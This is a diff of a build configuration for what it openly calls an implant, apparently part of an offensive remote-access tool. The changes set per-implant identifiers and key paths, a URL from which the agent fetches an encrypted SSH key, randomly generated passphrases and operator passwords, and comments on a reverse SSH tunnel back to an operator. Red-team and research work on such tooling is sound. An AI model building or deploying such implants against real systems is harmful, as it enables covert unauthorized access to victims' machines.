@@ -78,11 +78,14 @@ SSHServerPort=222
 # see gen_ssh_user.sh
 SSHServerUser=4fa48c653682c3b04add14f434a3114
 
-## Implant SSH protected private key
+# Implant ID
+ImplantID=${SSHServerUser}
+
+## Implant SSH protected B64 wrapped PK for distribution and embedding
 # Option A: Local encrypted key wrapped in Base64 which gets embedded into the implant
 # If file is embedded no remote SSH key fetch is made from the hosting server
-SSHServerUserKeyFile="./keys/agentx.sshkey_kg_enc.b64"
-SSHServerUserKey=$( /bin/cat ${SSHServerUserKeyFile} )
+SSHServerUserKeyFile="./out/${ImplantID}/${ImplantID}"
+# !! SSHServerUserKey= < contents of ${SSHServerUserKeyFile} > Filled in at build time
 
 # Option B: if the key needs to be pulled remotely
 # The agent pulls the protected key and decrypts a key with a password.
@@ -90,11 +93,12 @@ SSHServerUserKey=$( /bin/cat ${SSHServerUserKeyFile} )
 # Why not a direct pass-phrase encrypted SSH PK? Because there are a ton of SSH key file formats.
 # For now we want to deal with a straight RSA 4096 keys, without relying on OpenSSH format quirks.
 # tool: keygen.go
-SSHServerUserKeyUrl="http://127.0.0.1:9000/agentx.sshkey_kg_enc.b64"
+SSHServerUserKeyUrl="http://127.0.0.1:9000/${ImplantID}.bpk"
 
-# Implant SSH protection password (wire safety)
+# Implant SSH protection password (wire, in-code storage safety)
 # tool: keygen.go
-SSHServerUserKeyPassphrase=password
+SSHServerUserKeyPassphrase=$( dd if=/dev/urandom bs=1024 count=1 2>/dev/null | shasum | cut -c 1-31  )
+SSHServerUserKeyBits=4096
 
 # Channel IP for reverse SSH tunnel (addr)
 # After the initial SSH session is established
@@ -118,7 +122,7 @@ SSHRemoteCmdUser=operator
 # Operator Implant logon (password)
 # Randomized on every build.
 # Ex: SSHRemoteCmdPwd=da39a3ee5e6b4b0d3255bfef9560189
-SSHRemoteCmdPwd=$( dd if=/dev/urandom bs=1024 count=1 | shasum | cut -c 1-31  )
+SSHRemoteCmdPwd=$( dd if=/dev/urandom bs=1024 count=1 2>/dev/null | shasum | cut -c 1-31  )
 
 # The implant introspects SHELL variable from the destination environment,
 # If it is undefined it falls back to this:
